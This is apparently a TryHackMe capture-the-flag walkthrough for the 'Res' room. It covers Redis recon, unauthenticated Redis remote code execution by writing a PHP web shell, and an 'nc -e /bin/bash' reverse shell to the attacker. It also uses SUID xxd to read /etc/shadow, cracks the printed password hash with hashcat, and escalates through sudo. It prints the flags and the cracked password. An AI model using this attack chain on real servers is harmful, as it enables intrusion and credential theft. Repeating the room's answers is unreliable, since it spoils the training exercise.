# Retro Walkthrough
### Link
- https://tryhackme.com/room/res
---
### Recon
```
nmap -sC -sC -p- [IP]
```
**Namp scan result**
```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
6379/tcp open  redis   Redis key-value store 6.0.7
```
**Question**
#### Scan the machine, how many ports are open?
**Answer** 
#### 2

**Question**
#### What's is the database management system installed on the server?
**Answer** 
#### redis

**Question**
#### What port is the database management system running on?
**Answer** 
#### 6379

**Question**
#### What's is the version of management system installed on the server?
**Answer** 
#### 6.0.7

- Let's explore through the browser : http://[IP]

We found the common Apache page.Interesting point: 
```
The default Ubuntu document root is /var/www/html. You can make your own virtual hosts under /var/www.
```
```
sudo gobuster dir -u http://[IP] -w [Path]/directory-list-2.3-medium.txt
```
**Gobuster scan result**
```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.178.181
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /Users/laurentnebout/Documents/Tools/SecLists-master/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/12/31 13:33:23 Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 278]
```
---
### Exploitation
After some research in Google, I found this [link](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis#redis-rce). How to perform a **RCE** against **Redis**. 

- First: Install redis in the local machine in order to be able to communicate easily with the Redis Server
- Second: Connect to the Redis Server
```
sudo redis-cli -h [IP]
```
- Third: Follow the instruction from the [link](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis#redis-rce).
```
10.10.178.181:6379> config set dir /var/www/html
OK
10.10.178.181:6379> config set dbfilename rs.php
OK
10.10.178.181:6379> set cmd "<?php system($_GET['cmd']); ?>"
OK
10.10.178.181:6379> save
OK
```
- Fourth: check if the PHP payload works
```
http://[IP]/rs.php?cmd=whoami
```
Bingo!!! We receive the information.
- Fifth: Start a listener
```
nc -nlvp 4444
```
- Sixth: push a reverse shell command from the browser
```
http://10.10.178.181/rs.php?cmd=nc -e /bin/bash [IP] 4444
```
- Seventh:  Interactive Shell
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
**Question**
#### ompromise the machine and locate user.txt
```
Connection from 10.10.178.181:58900
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
whoami
www-data
ls -l
total 16
-rw-r--r-- 1 root   root   11321 Sep  2  2020 index.html
-rw-r--r-- 1 vianka vianka   133 Dec 31 10:54 rs.php
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/html$ cd /home
cd /home
www-data@ubuntu:/home$ ls -l
ls -l
total 4
drwxr-xr-x 5 vianka vianka 4096 Sep  2  2020 vianka
www-data@ubuntu:/home$ cd vianka
cd vianka
www-data@ubuntu:/home/vianka$ ls -l
ls -l
total 8
drwxrwxr-x 7 vianka vianka 4096 Sep  2  2020 redis-stable
-rw-rw-r-- 1 vianka vianka   35 Sep  2  2020 user.txt
www-data@ubuntu:/home/vianka$ cat user.txt
cat user.txt
thm{red1s_rce_w1thout_credent1als}
```
**Answer** 
#### thm{red1s_rce_w1thout_credent1als}


**Question**
#### What is the local user account password?
Let's check the access rights for **/etc/passwd** and **/etc/shadow**
```
-rw-r----- 1 root shadow   864 Sep  2  2020 shadow
-rw-r--r-- 1 root root    1416 Sep  2  2020 passwd
```
**passwd**
```
vianka:x:1000:1000:Res,,,:/home/vianka:/bin/bash
```
About **shadow**, we cannot read it. We need to find an alternative to read it with our current access rights.

- First: Check SID of available commands
```
www-data@ubuntu:/etc$ find / -perm -u=s 2>/dev/null
find / -perm -u=s 2>/dev/null
/bin/ping
/bin/fusermount
/bin/mount
/bin/su
/bin/ping6
/bin/umount
/usr/bin/chfn
/usr/bin/xxd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
```
Let's use **xxd**. This command can create a dump so we can read the content of shadow.
```
www-data@ubuntu:/etc$ xxd shadow
xxd shadow
00000000: 726f 6f74 3a21 3a31 3835 3037 3a30 3a39  root:!:18507:0:9
00000010: 3939 3939 3a37 3a3a 3a0a 6461 656d 6f6e  9999:7:::.daemon
00000020: 3a2a 3a31 3739 3533 3a30 3a39 3939 3939  :*:17953:0:99999
00000030: 3a37 3a3a 3a0a 6269 6e3a 2a3a 3137 3935  :7:::.bin:*:1795
00000040: 333a 303a 3939 3939 393a 373a 3a3a 0a73  3:0:99999:7:::.s
00000050: 7973 3a2a 3a31 3739 3533 3a30 3a39 3939  ys:*:17953:0:999
00000060: 3939 3a37 3a3a 3a0a 7379 6e63 3a2a 3a31  99:7:::.sync:*:1
00000070: 3739 3533 3a30 3a39 3939 3939 3a37 3a3a  7953:0:99999:7::
00000080: 3a0a 6761 6d65 733a 2a3a 3137 3935 333a  :.games:*:17953:
00000090: 303a 3939 3939 393a 373a 3a3a 0a6d 616e  0:99999:7:::.man
000000a0: 3a2a 3a31 3739 3533 3a30 3a39 3939 3939  :*:17953:0:99999
000000b0: 3a37 3a3a 3a0a 6c70 3a2a 3a31 3739 3533  :7:::.lp:*:17953
000000c0: 3a30 3a39 3939 3939 3a37 3a3a 3a0a 6d61  :0:99999:7:::.ma
000000d0: 696c 3a2a 3a31 3739 3533 3a30 3a39 3939  il:*:17953:0:999
000000e0: 3939 3a37 3a3a 3a0a 6e65 7773 3a2a 3a31  99:7:::.news:*:1
000000f0: 3739 3533 3a30 3a39 3939 3939 3a37 3a3a  7953:0:99999:7::
00000100: 3a0a 7575 6370 3a2a 3a31 3739 3533 3a30  :.uucp:*:17953:0
00000110: 3a39 3939 3939 3a37 3a3a 3a0a 7072 6f78  :99999:7:::.prox
00000120: 793a 2a3a 3137 3935 333a 303a 3939 3939  y:*:17953:0:9999
00000130: 393a 373a 3a3a 0a77 7777 2d64 6174 613a  9:7:::.www-data:
00000140: 2a3a 3137 3935 333a 303a 3939 3939 393a  *:17953:0:99999:
00000150: 373a 3a3a 0a62 6163 6b75 703a 2a3a 3137  7:::.backup:*:17
00000160: 3935 333a 303a 3939 3939 393a 373a 3a3a  953:0:99999:7:::
00000170: 0a6c 6973 743a 2a3a 3137 3935 333a 303a  .list:*:17953:0:
00000180: 3939 3939 393a 373a 3a3a 0a69 7263 3a2a  99999:7:::.irc:*
00000190: 3a31 3739 3533 3a30 3a39 3939 3939 3a37  :17953:0:99999:7
000001a0: 3a3a 3a0a 676e 6174 733a 2a3a 3137 3935  :::.gnats:*:1795
000001b0: 333a 303a 3939 3939 393a 373a 3a3a 0a6e  3:0:99999:7:::.n
000001c0: 6f62 6f64 793a 2a3a 3137 3935 333a 303a  obody:*:17953:0:
000001d0: 3939 3939 393a 373a 3a3a 0a73 7973 7465  99999:7:::.syste
000001e0: 6d64 2d74 696d 6573 796e 633a 2a3a 3137  md-timesync:*:17
000001f0: 3935 333a 303a 3939 3939 393a 373a 3a3a  953:0:99999:7:::
00000200: 0a73 7973 7465 6d64 2d6e 6574 776f 726b  .systemd-network
00000210: 3a2a 3a31 3739 3533 3a30 3a39 3939 3939  :*:17953:0:99999
00000220: 3a37 3a3a 3a0a 7379 7374 656d 642d 7265  :7:::.systemd-re
00000230: 736f 6c76 653a 2a3a 3137 3935 333a 303a  solve:*:17953:0:
00000240: 3939 3939 393a 373a 3a3a 0a73 7973 7465  99999:7:::.syste
00000250: 6d64 2d62 7573 2d70 726f 7879 3a2a 3a31  md-bus-proxy:*:1
00000260: 3739 3533 3a30 3a39 3939 3939 3a37 3a3a  7953:0:99999:7::
00000270: 3a0a 7379 736c 6f67 3a2a 3a31 3739 3533  :.syslog:*:17953
00000280: 3a30 3a39 3939 3939 3a37 3a3a 3a0a 5f61  :0:99999:7:::._a
00000290: 7074 3a2a 3a31 3739 3533 3a30 3a39 3939  pt:*:17953:0:999
000002a0: 3939 3a37 3a3a 3a0a 6d65 7373 6167 6562  99:7:::.messageb
000002b0: 7573 3a2a 3a31 3835 3036 3a30 3a39 3939  us:*:18506:0:999
000002c0: 3939 3a37 3a3a 3a0a 7575 6964 643a 2a3a  99:7:::.uuidd:*:
000002d0: 3138 3530 363a 303a 3939 3939 393a 373a  18506:0:99999:7:
000002e0: 3a3a 0a76 6961 6e6b 613a 2436 2432 702e  ::.vianka:$6$2p.
000002f0: 7453 5464 7324 7157 5166 7358 7758 4f41  tSTds$qWQfsXwXOA
00000300: 7847 4a55 4275 7132 5246 5871 6c4b 6971  xGJUBuq2RFXqlKiq
00000310: 6c33 6a78 6c77 4557 5a50 3643 5758 6d37  l3jxlwEWZP6CWXm7
00000320: 6b49 627a 5236 577a 6c78 4852 2e55 486d  kIbzR6WzlxHR.UHm
00000330: 692e 6863 312f 5475 554f 5542 6f2f 6a57  i.hc1/TuUOUBo/jW
00000340: 5161 5174 4753 5877 7672 6930 3a31 3835  QaQtGSXwvri0:185
00000350: 3037 3a30 3a39 3939 3939 3a37 3a3a 3a0a  07:0:99999:7:::.
```
Not really easy to read. 
```
xxd shadow | xxd -r
xxd shadow | xxd -r
root:!:18507:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18506:0:99999:7:::
uuidd:*:18506:0:99999:7:::
vianka:$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:18507:0:99999:7:::
```
It's better ^^.Now, we can use **hashcat** tocrack the password
```
sudo hashcat -a 0 -m 1800 '$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0'  [Path]rockyou.txt
```
```
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 3 secs

$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:beautiful1
```
**Answer** 
#### beautiful1
---
### Privilege escalation

**Question**
#### Escalate privileges and obtain root.txt

Let's check the command available now: 
```
www-data@ubuntu:/etc$ su - vianka
su - vianka
Password: beautiful1

vianka@ubuntu:~$ sudo -l
sudo -l
[sudo] password for vianka: beautiful1

Matching Defaults entries for vianka on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User vianka may run the following commands on ubuntu:
    (ALL : ALL) ALL
```
**Vianka** can run everything ^^
```
vianka@ubuntu:~$ sudo -s
sudo -s
root@ubuntu:~# cd /root
cd /root
root@ubuntu:/root# ls -l
ls -l
total 4
-rw-r--r-- 1 root root 25 Sep  2  2020 root.txt
root@ubuntu:/root# cat root.txt
cat root.txt
thm{xxd_pr1v_escalat1on}
```
**Answer** 
#### thm{xxd_pr1v_escalat1on}